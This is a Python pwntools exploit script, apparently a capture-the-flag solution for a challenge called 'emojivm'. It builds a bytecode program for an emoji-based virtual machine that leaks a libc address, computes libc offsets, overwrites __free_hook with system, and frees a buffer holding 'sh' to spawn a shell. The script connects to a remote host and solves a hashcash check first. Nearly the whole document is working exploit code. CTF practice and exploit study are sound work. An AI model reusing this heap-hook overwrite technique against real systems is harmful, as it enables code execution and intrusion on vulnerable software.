#!/usr/bin/env python3
from pwn import *
import os
import subprocess

code_table = {
    1: 127539,
    2: 10133,
    3: 10134,
    4: 10060,
    5: 10067,
    6: 10062,
    7: 128107,
    8: 128128,
    9: 128175,
    10: 128640,
    11: 127542,
    12: 127514,
    13: 9196,
    14: 128285,
    15: 128228,
    16: 128229,
    17: 127381,
    18: 127379,
    19: 128196,
    20: 128221,
    21: 128289,
    22: 128290,
    23: 128721,
}
data_table = {
    0: 128512,
    1: 128513,
    2: 128514,
    3: 129315,
    4: 128540,
    5: 128516,
    6: 128517,
    7: 128518,
    8: 128521,
    9: 128522,
    10: 128525,
}


# base
def add():
    return chr(code_table[0x02])


def sub():
    return chr(code_table[0x03])


def mul():
    return chr(code_table[0x04])


def eq():
    return chr(code_table[0x09])


def jnz():
    return chr(code_table[0x0c])


def push(v):
    return chr(code_table[0x0d]) + chr(data_table[v])


def pop():
    return chr(code_table[0x0e])


def ld():
    return chr(code_table[0x0f])


def st():
    return chr(code_table[0x10])


def alloc():
    return chr(code_table[0x11])


def free():
    return chr(code_table[0x12])


def input_str():
    return chr(code_table[0x13])


def print_str():
    return chr(code_table[0x14])


def print_stack():
    return chr(code_table[0x15])


def print_qword():
    return chr(code_table[0x16])


def done():
    return chr(code_table[0x17])


# extended
def dup():
    return push(0) + add()


def push_int(c):
    digits = []
    while True:
        digits.append(c % 10)
        c //= 10
        if c == 0:
            break
    digits.reverse()
    code = ''
    for i, d in enumerate(digits):
        if i != 0:
            code += push(10)
            code += mul()
        code += push(d)
        if i != 0:
            code += add()
    return code


def st_bytes(gptr_index, s):
    code = ''
    for i, c in enumerate(s):
        code += push_int(c)
        code += push_int(i)
        code += push_int(gptr_index)
        code += st()
    return code


code = ''
for _ in range(10):
    code += push_int(15) + alloc()
code += st_bytes(0, b'\n\0')
code += st_bytes(7, b'sh\0')
code += push(0) + pop()
code += add() + pop()
code += push(0) + sub()
code += (push(10) + add()) * 3 + push(2) + add()
code += push(0) + sub()
code += push(9) + free()
code += pop() * ((0x20E248 - 0x20e040) // 8)
# _IO_2_1_stderr_ -> this script
code += print_qword()
code += push(0) + print_str()
# <- gptr[8] <- __free_hook
code += push(0) + push(8) + input_str()
# this will allocate gptr[9], whose data pointer points to __free_hook
code += push_int(15) + alloc()
# <- _free_hook <- system
code += push(0) + push(9) + input_str()
code += push(7) + free()
code += done()
code = code.encode()
assert len(code) <= 1000, len(code)
with open('exploit.evm', 'wb') as fp:
    fp.write(code)
remote_p = True
if remote_p:
    p = remote('3.115.176.164', 30262)
else:
    p = process(['docker', 'run', '-i', '--rm', '-v', os.getcwd() + ':' + os.getcwd(), '-w', os.getcwd(), '--privileged', 'emojivm', 'emojivm_reverse/emojivm', 'exploit.evm'])
    #p = process(['docker', 'run', '-i', '--rm', '-v', os.getcwd() + ':' + os.getcwd(), '-w', os.getcwd(), '--privileged', 'emojivm', 'gdb', '-batch', '-x', 'gdbscript-malloc', '--args', 'emojivm_reverse/emojivm', 'exploit.evm'])
if remote_p:
    p.recvline()
    cmd = p.recvline().decode().split()
    print(cmd)
    assert (cmd[0] == 'hashcash')
    hc = subprocess.Popen(cmd, stdout=subprocess.PIPE)
    token = hc.stdout.read().decode().strip()
    print(token)
    p.recvuntil('hashcash token:')
    p.sendline(token)
    p.recvuntil('Your emoji file size:')
    p.sendline(str(len(code)))
    p.recvuntil('Input your emoji file:')
    p.send(code)
    p.recvline()
_IO_2_1_stderr_ = int(p.recvline().strip())
print(f'_IO_2_1_stderr_ = 0x{_IO_2_1_stderr_:x}')
libc_base = _IO_2_1_stderr_ - 0x3ec680
print(f'libc_base = 0x{libc_base:x}')
if not remote:
    assert(libc_base == 0x7ffff7443000)
__malloc_hook = libc_base + 0x3ebc30
print(f'__malloc_hook = 0x{__malloc_hook:x}')
__free_hook = libc_base + 0x3ed8e8
print(f'__free_hook = 0x{__free_hook:x}')
system = libc_base + 0x4f440
print(f'system = 0x{system:x}')
p.send(struct.pack('<Q', __free_hook) + b'x' * 6 + b'\n')
p.send(struct.pack('<Q', system) + b'x' * 6 + b'\n')
p.interactive()
